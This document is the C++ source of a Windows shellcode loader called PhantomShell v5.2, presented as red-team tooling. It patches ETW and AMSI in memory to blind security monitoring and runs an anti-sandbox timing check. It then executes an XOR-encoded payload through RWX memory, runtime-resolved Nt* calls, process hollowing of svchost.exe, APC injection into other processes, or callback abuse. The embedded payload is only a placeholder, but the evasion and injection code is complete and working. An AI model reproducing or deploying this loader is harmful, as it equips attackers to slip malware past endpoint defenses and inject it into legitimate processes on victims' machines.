/**
 * PhantomShell v5.2 — Shellcode Loader
 * AUTHORIZED USE ONLY. For licensed penetration testing, red-team engagements,
 * and authorized security research only. Unauthorized use against systems
 * without explicit written permission is illegal. Authors assume no liability.
 */
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>
#include <vector>
#include "../common/ntapi.h"
#include "../common/utils.h"

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// Compile-time XOR key for shellcode encryption/decryption
constexpr char XOR_KEY[] = "PhantomShell52";

// Placeholder XOR-encrypted shellcode (NOP+INT3 sled). Replace with real payload.
// Original: { 0x90, 0x90, 0x90, 0x90, 0xCC, 0xCC, 0xCC, 0xCC }
static unsigned char g_EncShellcode[] = {
    0x90^'P', 0x90^'h', 0x90^'a', 0x90^'n',
    0xCC^'t', 0xCC^'o', 0xCC^'m', 0xCC^'S'
};
static size_t g_ScSize = sizeof(g_EncShellcode);

// ---------------------------------------------------------------------------
// PatchETW — Patch EtwEventWrite with RET (0xC3) to blind ETW telemetry
// ---------------------------------------------------------------------------
static bool PatchETW() {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    FARPROC p = h ? GetProcAddress(h, "EtwEventWrite") : nullptr;
    if (!p) { fprintf(stderr, "[-] ETW resolve failed: %lu\n", GetLastError()); return false; }
    DWORD old = 0;
    if (!VirtualProtect((LPVOID)p, 1, PAGE_READWRITE, &old))
        { fprintf(stderr, "[-] VP(ETW): %lu\n", GetLastError()); return false; }
    *(BYTE*)p = 0xC3;  // Single RET instruction
    DWORD tmp; VirtualProtect((LPVOID)p, 1, old, &tmp);
    printf("[+] ETW patched (EtwEventWrite -> RET)\n");
    return true;
}

// ---------------------------------------------------------------------------
// PatchAMSI — Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
// Bytes: mov eax, 0x80070057; ret => B8 57 00 07 80 C3
// ---------------------------------------------------------------------------
static bool PatchAMSI() {
    HMODULE h = LoadLibraryA("amsi.dll");
    FARPROC p = h ? GetProcAddress(h, "AmsiScanBuffer") : nullptr;
    if (!p) { fprintf(stderr, "[-] AMSI resolve failed: %lu\n", GetLastError()); return false; }
    DWORD old = 0;
    if (!VirtualProtect((LPVOID)p, 6, PAGE_READWRITE, &old))
        { fprintf(stderr, "[-] VP(AMSI): %lu\n", GetLastError()); return false; }
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy((void*)p, patch, sizeof(patch));
    DWORD tmp; VirtualProtect((LPVOID)p, 6, old, &tmp);
    printf("[+] AMSI patched (AmsiScanBuffer -> AMSI_RESULT_CLEAN)\n");
    return true;
}

// ---------------------------------------------------------------------------
// LoadShellcode — Load from file (-f) or embedded array, XOR-decrypt in place
// ---------------------------------------------------------------------------
static std::vector<unsigned char> LoadShellcode(const std::string& path) {
    std::vector<unsigned char> sc;
    if (!path.empty()) {
        HANDLE hf = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                nullptr, OPEN_EXISTING, 0, nullptr);
        if (hf == INVALID_HANDLE_VALUE)
            { fprintf(stderr, "[-] Open %s: %lu\n", path.c_str(), GetLastError()); return sc; }
        DWORD sz = GetFileSize(hf, nullptr);
        if (!sz || sz == INVALID_FILE_SIZE) { CloseHandle(hf); return sc; }
        sc.resize(sz); DWORD rd = 0;
        if (!ReadFile(hf, sc.data(), sz, &rd, nullptr) || rd != sz)
            { CloseHandle(hf); sc.clear(); return sc; }
        CloseHandle(hf);
        printf("[*] Loaded %lu bytes from %s\n", (unsigned long)sz, path.c_str());
    } else {
        sc.assign(g_EncShellcode, g_EncShellcode + g_ScSize);
        printf("[*] Using embedded shellcode (%zu bytes)\n", g_ScSize);
    }
    PhantomUtils::XorCrypt(sc.data(), sc.size(),
                           reinterpret_cast<const uint8_t*>(XOR_KEY), sizeof(XOR_KEY) - 1);
    return sc;
}

// ---------------------------------------------------------------------------
// T1: VirtualAlloc(RWX) -> memcpy -> CreateThread -> WaitForSingleObject
// ---------------------------------------------------------------------------
static bool T1_VirtualAlloc(const std::vector<unsigned char>& sc) {
    printf("[*] Technique 1: VirtualAlloc + CreateThread\n");
    LPVOID mem = VirtualAlloc(nullptr, sc.size(), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { fprintf(stderr, "[-] VirtualAlloc: %lu\n", GetLastError()); return false; }
    memcpy(mem, sc.data(), sc.size());
    HANDLE ht = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
    if (!ht) { fprintf(stderr, "[-] CreateThread: %lu\n", GetLastError()); VirtualFree(mem, 0, MEM_RELEASE); return false; }
    printf("[+] Thread running\n");
    WaitForSingleObject(ht, INFINITE);
    CloseHandle(ht); VirtualFree(mem, 0, MEM_RELEASE);
    return true;
}

// ---------------------------------------------------------------------------
// T2: Direct Syscalls — resolve Nt* from ntdll at runtime to dodge IAT hooks.
// NtAllocateVirtualMemory(RW) -> NtWriteVirtualMemory ->
// NtProtectVirtualMemory(RX) -> NtCreateThreadEx
// ---------------------------------------------------------------------------
static bool T2_DirectSyscalls(const std::vector<unsigned char>& sc) {
    printf("[*] Technique 2: Direct Syscalls via ntdll\n");
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    if (!nt) { fprintf(stderr, "[-] ntdll not found\n"); return false; }

    auto fAlloc  = (pNtAllocateVirtualMemory)GetProcAddress(nt, "NtAllocateVirtualMemory");
    auto fWrite  = (pNtWriteVirtualMemory)GetProcAddress(nt, "NtWriteVirtualMemory");
    auto fProt   = (pNtProtectVirtualMemory)GetProcAddress(nt, "NtProtectVirtualMemory");
    auto fThread = (pNtCreateThreadEx)GetProcAddress(nt, "NtCreateThreadEx");
    if (!fAlloc || !fWrite || !fProt || !fThread)
        { fprintf(stderr, "[-] Nt* resolve failed\n"); return false; }

    HANDLE hp = GetCurrentProcess();
    PVOID base = nullptr; SIZE_T rsz = sc.size();
    // Allocate RW first (not RWX) — upgrade to RX after writing
    NTSTATUS st = fAlloc(hp, &base, 0, &rsz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (st) { fprintf(stderr, "[-] NtAlloc: 0x%08lX\n", (unsigned long)st); return false; }

    SIZE_T bw = 0;
    st = fWrite(hp, base, (PVOID)sc.data(), sc.size(), &bw);
    if (st) { fprintf(stderr, "[-] NtWrite: 0x%08lX\n", (unsigned long)st); return false; }

    // Flip RW -> RX after shellcode is written
    ULONG oldP = 0; SIZE_T psz = sc.size(); PVOID pb = base;
    st = fProt(hp, &pb, &psz, PAGE_EXECUTE_READ, &oldP);
    if (st) { fprintf(stderr, "[-] NtProtect: 0x%08lX\n", (unsigned long)st); return false; }

    HANDLE ht = nullptr;
    st = fThread(&ht, THREAD_ALL_ACCESS, nullptr, hp, base, nullptr, FALSE, 0, 0, 0, nullptr);
    if (st || !ht) { fprintf(stderr, "[-] NtCreateThread: 0x%08lX\n", (unsigned long)st); return false; }
    printf("[+] Syscall thread created\n");
    WaitForSingleObject(ht, INFINITE); CloseHandle(ht);
    return true;
}

// ---------------------------------------------------------------------------
// T3: Process Hollowing — suspend svchost, unmap image, inject shellcode.
// PEB layout (x64): PEB+0x10 = ImageBaseAddress
// ---------------------------------------------------------------------------
static bool T3_ProcessHollow(const std::vector<unsigned char>& sc) {
    printf("[*] Technique 3: Process Hollowing (svchost.exe)\n");
    STARTUPINFOA si{}; PROCESS_INFORMATION pi{}; si.cb = sizeof(si);
    char tgt[] = "C:\\Windows\\System32\\svchost.exe";
    if (!CreateProcessA(tgt, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        { fprintf(stderr, "[-] CreateProcess: %lu\n", GetLastError()); return false; }
    printf("[+] Suspended PID %lu\n", (unsigned long)pi.dwProcessId);

    HMODULE nt = GetModuleHandleA("ntdll.dll");
    auto fQuery = (pNtQueryInformationProcess)GetProcAddress(nt, "NtQueryInformationProcess");
    auto fUnmap = (pNtUnmapViewOfSection)GetProcAddress(nt, "NtUnmapViewOfSection");
    if (!fQuery || !fUnmap) {
        fprintf(stderr, "[-] Nt* resolve failed\n");
        goto hollow_fail;
    }

    {   // Scope for local declarations
        PROCESS_BASIC_INFORMATION pbi{}; ULONG rl = 0;
        if (fQuery(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &rl))
            { fprintf(stderr, "[-] NtQueryInfo failed\n"); goto hollow_fail; }

        // Read original image base from PEB+0x10 (ImageBaseAddress on x64)
        PVOID imgBase = nullptr; SIZE_T br = 0;
        if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imgBase, sizeof(imgBase), &br))
            { fprintf(stderr, "[-] RPM(PEB): %lu\n", GetLastError()); goto hollow_fail; }

        fUnmap(pi.hProcess, imgBase);

        // Allocate at original base; fall back to any address
        LPVOID rm = VirtualAllocEx(pi.hProcess, imgBase, sc.size(), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!rm) rm = VirtualAllocEx(pi.hProcess, nullptr, sc.size(), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!rm) { fprintf(stderr, "[-] VAllocEx: %lu\n", GetLastError()); goto hollow_fail; }

        SIZE_T bw = 0;
        if (!WriteProcessMemory(pi.hProcess, rm, sc.data(), sc.size(), &bw))
            { fprintf(stderr, "[-] WPM: %lu\n", GetLastError()); goto hollow_fail; }

        // Set RCX to shellcode address (x64: RCX = entry for initial thread)
        CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &ctx))
            { fprintf(stderr, "[-] GetCtx: %lu\n", GetLastError()); goto hollow_fail; }
        ctx.Rcx = (DWORD64)rm;
        if (!SetThreadContext(pi.hThread, &ctx))
            { fprintf(stderr, "[-] SetCtx: %lu\n", GetLastError()); goto hollow_fail; }

        ResumeThread(pi.hThread);
        printf("[+] Hollowed & resumed PID %lu\n", (unsigned long)pi.dwProcessId);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return true;
    }

hollow_fail:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return false;
}

// ---------------------------------------------------------------------------
// T4: APC Injection — queue shellcode as APC on all threads of target PID.
// Executes when a thread enters alertable wait (SleepEx, WaitFor*Ex).
// ---------------------------------------------------------------------------
static bool T4_APCInjection(const std::vector<unsigned char>& sc, DWORD pid) {
    printf("[*] Technique 4: APC Injection into PID %lu\n", (unsigned long)pid);
    HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hp) { fprintf(stderr, "[-] OpenProcess: %lu\n", GetLastError()); return false; }

    LPVOID rm = VirtualAllocEx(hp, nullptr, sc.size(), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!rm) { fprintf(stderr, "[-] VAllocEx: %lu\n", GetLastError()); CloseHandle(hp); return false; }
    SIZE_T bw = 0;
    if (!WriteProcessMemory(hp, rm, sc.data(), sc.size(), &bw))
        { fprintf(stderr, "[-] WPM: %lu\n", GetLastError()); CloseHandle(hp); return false; }
    // Upgrade RW -> RX after write
    DWORD old = 0;
    if (!VirtualProtectEx(hp, rm, sc.size(), PAGE_EXECUTE_READ, &old))
        { fprintf(stderr, "[-] VPEx: %lu\n", GetLastError()); CloseHandle(hp); return false; }

    // Enumerate threads and queue APC on each belonging to target
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE)
        { fprintf(stderr, "[-] Snapshot: %lu\n", GetLastError()); CloseHandle(hp); return false; }
    THREADENTRY32 te{}; te.dwSize = sizeof(te); int cnt = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (ht) { if (QueueUserAPC((PAPCFUNC)rm, ht, 0)) cnt++; CloseHandle(ht); }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap); CloseHandle(hp);
    if (!cnt) { fprintf(stderr, "[-] No APCs queued\n"); return false; }
    printf("[+] Queued APC on %d thread(s)\n", cnt);
    return true;
}

// ---------------------------------------------------------------------------
// T5: Callback Injection — abuse EnumWindows or CreateTimerQueueTimer to
// invoke shellcode as a system callback.
// ---------------------------------------------------------------------------
static bool T5_CallbackInjection(const std::vector<unsigned char>& sc) {
    printf("[*] Technique 5: Callback Injection\n");
    LPVOID mem = VirtualAlloc(nullptr, sc.size(), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { fprintf(stderr, "[-] VAlloc: %lu\n", GetLastError()); return false; }
    memcpy(mem, sc.data(), sc.size());

    // Primary: EnumWindows calls our shellcode as WNDENUMPROC per top-level window
    printf("[*] Trying EnumWindows callback...\n");
    if (EnumWindows((WNDENUMPROC)mem, 0)) {
        printf("[+] EnumWindows OK\n"); VirtualFree(mem, 0, MEM_RELEASE); return true;
    }
    // Fallback: timer queue callback
    printf("[*] Fallback: CreateTimerQueueTimer\n");
    HANDLE hQ = CreateTimerQueue(), hT = nullptr;
    if (!hQ) { fprintf(stderr, "[-] TimerQueue: %lu\n", GetLastError()); VirtualFree(mem, 0, MEM_RELEASE); return false; }
    if (!CreateTimerQueueTimer(&hT, hQ, (WAITORTIMERCALLBACK)mem, nullptr, 0, 0, WT_EXECUTEINTIMERTHREAD))
        { fprintf(stderr, "[-] Timer: %lu\n", GetLastError()); DeleteTimerQueue(hQ); VirtualFree(mem, 0, MEM_RELEASE); return false; }
    Sleep(1000);
    DeleteTimerQueueTimer(hQ, hT, INVALID_HANDLE_VALUE); DeleteTimerQueue(hQ);
    printf("[+] Timer callback executed\n");
    VirtualFree(mem, 0, MEM_RELEASE);
    return true;
}

// ---------------------------------------------------------------------------
// main — Parse arguments, patch defenses, load shellcode, run technique
// ---------------------------------------------------------------------------
int main(int argc, char* argv[]) {
    int tech = 0; DWORD pid = 0; std::string scFile;
    bool doEtw = true, doAmsi = true;

    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        if      (a == "-t" && i+1 < argc) tech = atoi(argv[++i]);
        else if (a == "-p" && i+1 < argc) pid = (DWORD)atol(argv[++i]);
        else if (a == "-f" && i+1 < argc) scFile = argv[++i];
        else if (a == "--no-etw")  doEtw = false;
        else if (a == "--no-amsi") doAmsi = false;
    }

    printf("===========================================================\n");
    printf("  [*] PhantomLoader v5.2 -- Shellcode Loader\n");
    printf("  [*] 1=VirtualAlloc 2=Syscalls 3=Hollow 4=APC 5=Callback\n");
    printf("===========================================================\n\n");

    if (tech < 1 || tech > 5) {
        fprintf(stderr, "Usage: %s -t <1-5> [-p <pid>] [-f <file>] [--no-etw] [--no-amsi]\n", argv[0]);
        return 1;
    }
    if (tech == 4 && !pid) { fprintf(stderr, "[-] Technique 4 requires -p <PID>\n"); return 1; }

    // Anti-sandbox: timing check — if sleep is accelerated, environment is sandboxed
    printf("[*] Anti-sandbox check...\n");
    if (!PhantomUtils::AntiSandboxSleep(2000))
        { fprintf(stderr, "[!] Sandbox detected. Exiting.\n"); return 2; }
    printf("[+] Passed\n\n");

    if (doEtw)  PatchETW();  else printf("[*] ETW skip (--no-etw)\n");
    if (doAmsi) PatchAMSI(); else printf("[*] AMSI skip (--no-amsi)\n");
    printf("\n");

    std::vector<unsigned char> sc = LoadShellcode(scFile);
    if (sc.empty()) { fprintf(stderr, "[-] No shellcode. Aborting.\n"); return 3; }
    printf("[+] Shellcode ready (%zu bytes)\n\n", sc.size());

    printf("[*] Executing technique %d...\n", tech);
    bool ok = false;
    switch (tech) {
        case 1: ok = T1_VirtualAlloc(sc);       break;
        case 2: ok = T2_DirectSyscalls(sc);      break;
        case 3: ok = T3_ProcessHollow(sc);       break;
        case 4: ok = T4_APCInjection(sc, pid);   break;
        case 5: ok = T5_CallbackInjection(sc);   break;
    }

    if (ok) printf("\n[+] Technique %d succeeded.\n", tech);
    else    fprintf(stderr, "\n[-] Technique %d failed.\n", tech);

    SecureZeroMemory(sc.data(), sc.size());
    return ok ? 0 : 4;
}
